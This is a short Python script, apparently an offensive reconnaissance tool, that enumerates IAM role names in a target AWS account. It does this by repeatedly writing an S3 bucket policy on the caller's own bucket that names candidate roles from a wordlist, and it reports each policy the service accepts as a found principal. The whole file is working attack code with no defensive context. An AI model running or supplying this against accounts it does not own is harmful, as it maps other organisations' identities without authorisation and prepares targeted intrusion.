#!/usr/bin/env python3
import boto3, botocore, argparse

parser = argparse.ArgumentParser(description='Enumerate IAM/Users of an AWS account')
parser.add_argument('--id', required=True, help="The account id of the target account")
parser.add_argument('--my_bucket', required=True, help="The bucket used for testing (belongs to you)")
parser.add_argument('--wordlist', help="Wordlist containers user/role names")
args = parser.parse_args()

account_id = args.id
bucket_name = args.my_bucket

session = boto3.session.Session()
s3 = session.resource('s3')
bucket_policy = s3.BucketPolicy(bucket_name)

if args.wordlist:
    wordlist = args.wordlist
else:
    wordlist = 'default-word-list.txt'

with open(wordlist, 'r') as r:
    for name in r:
        policy_json = '{"Version":"2012-10-17","Statement":[{"Sid":"Example permissions","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::'+ account_id +':role/'+ name[:-1] +'"},"Action":["s3:ListBucket"],"Resource":"arn:aws:s3:::'+ bucket_name +'"}]}'

        try:
            bucket_policy.put(Policy=policy_json)
            print("User Found!:", name)
        except botocore.exceptions.ClientError as error:
            None
